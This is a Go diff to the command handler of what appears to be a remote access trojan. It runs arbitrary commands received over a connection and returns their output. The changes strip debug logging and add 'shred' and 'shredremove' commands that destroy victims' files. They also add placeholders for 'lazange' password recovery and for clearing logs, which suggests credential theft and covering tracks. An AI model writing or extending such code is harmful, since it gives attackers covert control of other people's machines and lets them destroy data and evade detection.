@@ -46,7 +46,6 @@ func (c *connection) shell() {
 			c.recvFile(cmdsp[1])
 		case "cd":
 			fname := strings.Split(cmd, " ")[1]
-			log.Println("[" + fname + "]")
 			err := os.Chdir(fname)
 			if err != nil {
 				output = []byte("Could not Change Directory")
@@ -64,21 +63,22 @@ func (c *connection) shell() {
 		case "ping":
 			output = []byte("pong")
 		case "cat":
-			log.Println(cmdsp)
 			output = []byte(cat.Cat(cmdsp[1]))
 
 		case "reconnect":
 			break
-		case "sync":
-			c.sync()
-		case "askpass":
-
-		case "info":
-
+		case "lazange":
+			// TODO: add password recovery
+		case "shred":
+			shred.Path(cmdsp[1], false)
+			output = []byte("File(s) are shredded")
+		case "shredremove":
+			shred.Path(cmdsp[1], true)
+			output = []byte("Files are shredded and removed")
 		case "escape":
 			runCmd(cmdsp[1], false)
 		case "clearlog":
-
+			// TODO: clear all logs
 		case "cwd":
 			path, err := os.Getwd()
 			if err != nil {
@@ -94,10 +94,6 @@ func (c *connection) shell() {
 			}
 			output = []byte(strings.Join(files, " "))
 
-		case "shred":
-			shred.Path(cmdsp[1], true)
-			output = []byte("Shredded and deleted file")
-
 		default:
 			output = runCmd(cmd, false)
 		}
@@ -107,11 +103,6 @@ func (c *connection) shell() {
 			c.send(output)
 		}
 	}
-}
-
-// TODO: add sync for the logs
-func (c *connection) sync() {
-
 }
 
 func runCmd(cmd string, powershell bool) []byte {
